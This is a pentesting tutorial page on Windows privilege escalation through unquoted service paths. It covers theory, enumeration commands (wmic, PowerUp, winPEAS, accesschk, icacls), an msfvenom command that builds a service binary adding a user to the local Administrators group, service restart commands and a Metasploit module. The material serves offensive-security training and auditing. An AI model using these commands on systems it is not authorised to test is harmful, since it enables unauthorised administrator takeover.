# Unquoted Service Paths

## Theory

If the path to an executable is not enclosed in quotes, Windows will try to run all the endings before a space.

For example, for the path `C:\Program Files\Some1 Folder\Some2 Folder\test.exe` Windows will try to run it:

```bash
C:\Program.exe 
C:\Program Files\Some1.exe 
C:\Program Files\Some1 Folder\Some2.exe
C:\Program Files\Some1 Folder\Some2 Folder\test.exe
```

* If we have write permissions on `C:\`, we can create a malicious executable named `Program.exe`.
* If we have write permissions on `Program Files`, we can create a malicious executable named `Some1.exe`.
* If we have write permissions on `Some1 Folder`, we can create a malicious executable called `Some2.exe`.
* If we have write permissions on `Some2 Folder`, we can NOT create a malicious executable.

That is to say, except in the penultimate path, if we have write permissions in the others, and the service that executes the **.exe** does not have quotes, there are great possibilities to escalate privileges. The only thing that remains to be verified is if the service starts by itself or if we have permissions to start/stop it. All these steps will be covered in the Verification section.

## Verification

{% tabs %}
{% tab title="Manual (part 1)" %}
### Manual verification (part 1)

In the first part, there are 5 simple conditions that must be met in the following order:

```shell
# 1. Search Unquoted Service Path:
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """ # PS
cmd /c 'wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """' # CMD
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

# 2. The path of the binary must contain at least 1 space. Example: C:\Program Files CustomApp.exe
```

We then proceed to do the following to each service name to see if they meet the 3 missing conditions:

```bash
sc qc <NAME SERVICE>
```

3 conditions must be met:

* The `BINARY_PATH_NAME` must not have quotes.
* The `BINARY_PATH_NAME` must contain spaces.
* The `SERVICE_START_NAME` must be **LocalSystem** (or another user).
* (OPTIONAL) : The `START_TYPE` can be `1` (it will be necessary to restart the computer), `2` (automatic service, although we have to check if we can restart even so) and `3` (it must be started manually and it is the most convenient if we have permissions to do it).

<table><thead><tr><th>Start Type</th><th align="center">Code</th><th>Description</th><th data-type="checkbox">PrivEsc?</th></tr></thead><tbody><tr><td>Automatic</td><td align="center">2</td><td>Indicates that the service must be started (or was started) by the operating system, at system startup. If an automatically started service depends on a manually started service, the manually started service is also automatically started at system startup.</td><td>true</td></tr><tr><td>Manual</td><td align="center">3</td><td>Indicates that the service is started only manually, by a user (via the Service Control Manager) or by an application.</td><td>true</td></tr><tr><td>Boot</td><td align="center">0</td><td>Indicates that the service is a device driver started by the system loader. This value is only valid for device drivers.</td><td>false</td></tr><tr><td>Disabled</td><td align="center">4</td><td>Indicates that the service is disabled, so it cannot be started by a user or application.</td><td>false</td></tr><tr><td>System</td><td align="center">1</td><td>Indicates that the service is a device driver started by the <code>IOInitSystem</code> function. This value is only valid for device drivers.</td><td>false</td></tr></tbody></table>

If everything is fulfilled, we move on to part 2 of the verification.
{% endtab %}

{% tab title="Automatic  (part 1)" %}
### PowerUp

```powershell
Invoke-AllChecks
```

![Example of a potentially vulnerable service (without quotes, with spaces, with modifiable paths, with restart permissions and that the binary is executed with SYSTEM permissions).](../../../../.gitbook/assets/unquoted\_service\_path.png)

The following 4 conditions must be met:

* **Path** : The path must contain **spaces** and **not have quotes**.
* **StartName = LocalSystem**: This tells us that the service is running with system privileges.
* **CanRestart = True** : The service should be able to restart, although this happens in most cases. If it tells us False, surely if the computer is restarted, all services will be restarted.
* **ModifiablePath**: This field must tell us the modifiable directory (Modifiable Path), and in the "IdentityReference" field it must tell us a group where we are to write on that directory.

If the 4 conditions are met, we can go directly to the privilege escalation.

{% hint style="info" %}
PowerUp checks all services, so we don't have to worry too much.
{% endhint %}

### winPEAS

```
winPEAS.exe quit servicesinfo
```

![winPEAS info](../../../../.gitbook/assets/unquoted\_service\_path\_winpeas.png)

Explanation of the information provided by winPEAS in the image above:

* The service and possible privilege escalation (Unquoted Path Service).
* The path of the binary.
* It must be started manually, that would be the configuration called START\_TYPE = DEMAND\_START (2).
* The service is stopped.
* And it tells us that it has no quotes and that it has spaces.

Now, we can move on to part 2 of the verification.
{% endtab %}

{% tab title="Verification (part 2)" %}
Now we have to check 2 conditions, if we have permissions to start/stop the service and if we have permissions on a directory in the path of the binary.

### Permissions to start/stop the service

```shell
# Accesschk:
accesschk64.exe /accepteula -ucqv <USERNAME> <SERVICE NAME>

# sdshow:
whoami /user # Remember the SID.
sc sdshow <SERVICE NAME>
## We look for the SID and we see the permissions: 
## If it has RP (SERVICE_START) and WP (SERVICE_STOP)

# Get-ACL
Get-ACL -Path HKLM:\System\CurrentControlSet\Services\<SERVICE NAME> | fl
## RP (SERVICE_START) and WP (SERVICE_STOP)

# Get-ServiceACL (we can download and import the script from here: https://raw.githubusercontent.com/Sambal0x/tools/master/Get-ServiceAcl.ps1)
"<SERVICE NAME>" | Get-ServiceAcl | select -ExpandProperty Access
```

### Permissions in a directory in the path of the binary

Let's see if we can write to some of these directories.

```shell
# Example:
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
# Paths:
C:\Program.exe # Only if we have write permissions in C:\
C:\Program Files\Unquoted.exe # Only if we have write permissions in C:\Program Files
C:\Program Files\Unquoted Path.exe # Only if we have write permissions in C:\Program Files
C:\Program Files\Unquoted Path Service\Common.exe # Only if we have write permissions on C:\Program Files\Unquoted Path Service
# To verify this, we can do it through several utilities:
icacls <PATH>
accesschk.exe /accepteula -uwdq "<PATH>"
Get-ACL -Path "<PATH>" | fl
```
{% endtab %}
{% endtabs %}

## Privilege Escalation

{% tabs %}
{% tab title="Malicious EXE" %}
We can generate an EXE file, containing a malicious payload such as a reverse shell, execute a command, etc. The name of the binary must be with the name of a part of the directory (example of common files: Common.exe) and we load it in the directory where we have write permissions.

{% content-ref url="../../../reverse-shells/windows-rev-shells.md" %}
[windows-rev-shells.md](../../../reverse-shells/windows-rev-shells.md)
{% endcontent-ref %}

```shell
# Add user to Administrators group:
msfvenom -p windows/exec CMD='net localgroup administrators <USER> /add' -f exe-service -o common.exe
```

Finally, if the service is started, we stop it and start it again:

```shell
# Stop service:
sc stop <SERVICE_NAME>
net stOP <SERVICE_NAME>
# Start service:
sc start <SERVICE_NAME>
net start <SERVICE_NAME>
```
{% endtab %}

{% tab title="Metasploit" %}
```
exploit/windows/local/trusted_service_path
```
{% endtab %}
{% endtabs %}
